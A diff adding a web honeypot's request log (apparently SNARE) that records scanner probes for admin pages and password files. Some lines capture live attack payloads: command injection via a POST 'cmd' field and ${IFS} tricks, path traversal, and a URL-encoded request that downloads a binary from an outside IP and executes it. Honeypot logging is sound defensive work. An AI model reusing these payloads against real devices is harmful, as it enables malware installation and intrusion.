@@ -1,0 +1,205 @@
+
+   _____ _   _____    ____  ______
+  / ___// | / /   |  / __ \/ ____/
+  \__ \/  |/ / /| | / /_/ / __/
+ ___/ / /|  / ___ |/ _, _/ /___
+/____/_/ |_/_/  |_/_/ |_/_____/
+
+    
+server
+privileges dropped, running as "nobody:nogroup"
+serving on ('130.255.78.172', 80) with uuid 14d0998d-480d-4f09-9499-43301051a1e9
+you are running the latest version
+Request path: /
+Request path: /favicon.ico
+Request path: /favicon.ico
+Request path: /root
+Request path: /login
+Request path: /phpmyadmin
+Request path: /root
+Request path: /
+Request path: /robots.txt
+Request path: /pass
+Request path: /password.txt
+Request path: /password
+Request path: /log
+Request path: /administrator
+Request path: /auth
+Request path: /auth/login
+Request path: /auth/login
+Request path: /index.html
+Request path: /index.php
+Request path: /login.php
+Request path: /admin
+Request path: /admin
+Request path: /
+
+
+   _____ _   _____    ____  ______
+  / ___// | / /   |  / __ \/ ____/
+  \__ \/  |/ / /| | / /_/ / __/
+ ___/ / /|  / ___ |/ _, _/ /___
+/____/_/ |_/_/  |_/_/ |_/_____/
+
+    
+server
+privileges dropped, running as "nobody:nogroup"
+serving on ('130.255.78.172', 80) with uuid 14d0998d-480d-4f09-9499-43301051a1e9
+you are running the latest version
+Request path: /
+Request path: /login
+Request path: /root
+Request path: /admin
+Request path: /login.php
+Request path: /index.php
+Request path: /auth/login
+Request path: /auth
+Request path: /administrator
+Request path: /password
+Request path: /password.txt
+Request path: /pass
+Request path: /robots.txt
+Request path: /root
+Request path: /phpmyadmin
+Request path: /login
+Request path: /root
+Request path: /index.html
+Request path: /index.php
+Request path: /contact
+Request path: /robots.txt
+Request path: /hidden
+Request path: /
+Request path: /index.html
+Request path: /
+Request path: /login
+Request path: /forgotpass
+Request path: /
+Request path: /
+Request path: /form
+Request path: /
+Request path: /
+Dorks timeout
+Request path: /cgi/common.cgi
+Request path: /command.php
+POST data:
+	- cmd: cd /var/tmp && echo -ne \\x3610cker > 610cker.txt && cat 610cker.txt
+Request path: /language/Swedish${IFS}&&echo${IFS}610cker>qt&&tar${IFS}/string.js
+Request path: /../../../../../../../mnt/mtd/qt
+Request path: /
+Request path: /
+Request path: /favicon.ico
+Request path: /favicon.ico
+Request path: /
+Request path: /index.html
+Request path: /login
+Request path: /auth
+Request path: /robots.txt
+Request path: /auth/login
+Request path: /administrator
+Request path: /phpmyadmin
+Request path: /phpmyadmin
+Request path: /
+Request path: /
+Request path: /favicon.ico
+Request path: /favicon.ico
+Request path: /favicon.ico
+Request path: /favicon.ico
+Request path: /favicon.ico
+Request path: /favicon.ico
+Request path: /
+you are running the latest version
+Request path: /
+Request path: /
+Request path: /nice%20ports%2C/Tri%6Eity.txt%2ebak
+Request path: /robots.txt
+Request path: /
+Request path: /
+Request path: /
+POST data:
+Request path: /
+Request path: /
+Request path: /
+Request path: /nmaplowercheck1480791133
+Request path: /
+Request path: /.git/HEAD
+Request path: /
+Dorks timeout
+Request path: /HNAP1
+Request path: /
+Dorks timeout
+Request path: /favicon.ico
+Request path: /
+Dorks timeout
+Dorks timeout
+Dorks timeout
+Dorks timeout
+Dorks timeout
+Request path: /
+Dorks timeout
+Request path: /
+Request path: /
+Dorks timeout
+Dorks timeout
+Dorks timeout
+Request path: /
+Request path: /
+Request path: /
+Request path: /
+POST data:
+Request path: /
+Dorks timeout
+Request path: /
+Request path: /
+Request path: /
+Request path: /
+Request path: /
+Request path: /
+Request path: /
+Request path: /
+Request path: /shell?%63%64%20%2F%74%6D%70%3B%77%67%65%74%20%2D%63%20%68%74%74%70%3A%2F%2F%31%32%32%2E%31%31%34%2E%32%35%33%2E%39%34%3A%31%35%35%32%31%2F%61%72%6D%67%67%3B%63%68%6D%6F%64%20%37%37%37%20%61%72%6D%67%67%3B%2E%2F%61%72%6D%67%67%20%26
+Request path: /
+Dorks timeout
+Request path: /webdav/
+you are running the latest version
+Request path: /x
+Request path: /webdav/
+Request path: /webdav/
+Request path: /
+Request path: /webdav/
+Request path: /webdav/
+Request path: /
+Request path: /
+you are running the latest version
+Request path: /phpmyadmin/index.php
+Request path: /
+Request path: /
+Request path: /
+you are running the latest version
+Request path: /
+Request path: /webdav/
+Request path: /w00tw00t.at.blackhats.romanian.anti-sec:)
+Request path: /phpmyadmin/scripts/setup.php
+Request path: /pma/scripts/setup.php
+Request path: /myadmin/scripts/setup.php
+Request path: /MyAdmin/scripts/setup.php
+Request path: /
+Request path: /
+you are running the latest version
+Request path: /
+Request path: /
+Request path: /cgi/common.cgi
+Request path: /stssys.htm
+Request path: /
+Request path: /command.php
+POST data:
+	- cmd: cd /var/tmp && echo -ne \\x3610cker > 610cker.txt && cat 610cker.txt
+Request path: /language/Swedish${IFS}&&echo${IFS}610cker>qt&&tar${IFS}/string.js
+Request path: /../../../../../../../mnt/mtd/qt
+Request path: /
+Request path: /
+Request path: /
+Request path: /favicon.ico
+Request path: /favicon.ico
+you are running the latest version
+Request path: /
+Request path: /favicon.ico
